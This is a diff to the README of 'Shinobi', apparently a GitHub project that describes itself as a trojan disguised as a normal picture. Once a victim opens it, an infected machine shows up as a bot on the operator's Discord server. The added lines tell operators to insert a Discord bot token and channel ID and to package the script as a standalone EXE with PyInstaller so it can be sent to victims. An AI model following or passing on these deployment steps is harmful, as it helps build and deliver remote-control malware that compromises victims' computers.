@@ -19,9 +19,23 @@ Shinobi is a trojan that disguises itself as a normal picture, but when a victim
 * Shinobi is plug-and play trojan software, which basically means all you need to do is send the payload or image to the victim, and the script will take over from there. Once the script is triggered, you should see a bot that will be online on your Discord server.
 
 # How to use shinobi [for developers]
-- Run
-- 
+- Run _**pip install -r requirements.txt**_ to make sure every packages is installed
 ```bash
 pip install -r requirements.txt
 ```
 ![Capture](https://github.com/p3nut-ai/shinobi_finals/assets/49468484/34a2a9f5-934b-42b7-a4b1-9fb4dccaf676)
+
+- open main.py to edit **Discord bot token** and **Server Channel ID** or add your own command.
+- once finished make sure to convert the python file to an **executable EXE**
+
+  #Convert py to exe
+  - Install PyInstaller package
+    ```bash
+    pip install pyinstaller 
+    ```
+  - Once done then convert the py to exe by executing this command.
+     ```bash
+    pyinstaller [your python file].py --onefile
+    ```
+    
+
